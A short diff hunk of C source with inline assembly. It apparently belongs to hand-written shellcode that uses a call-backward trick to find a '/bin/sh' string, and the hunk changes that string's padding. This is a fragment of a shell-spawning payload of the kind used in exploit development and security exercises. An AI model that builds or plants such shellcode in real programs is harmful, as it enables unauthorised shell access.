@@ -26,7 +26,7 @@ __asm__
   //"string_var:"
   //"call   entry\n\t"          // # 5 bytes
   "call   .-0x2a\n\t"          // # 5 bytes
-  ".string \"/bin/sh               \"\n\t"     // # 8 bytes
+  ".string \"/bin/sh987654321\"\n\t"     // # 8 bytes
 );
 }
 
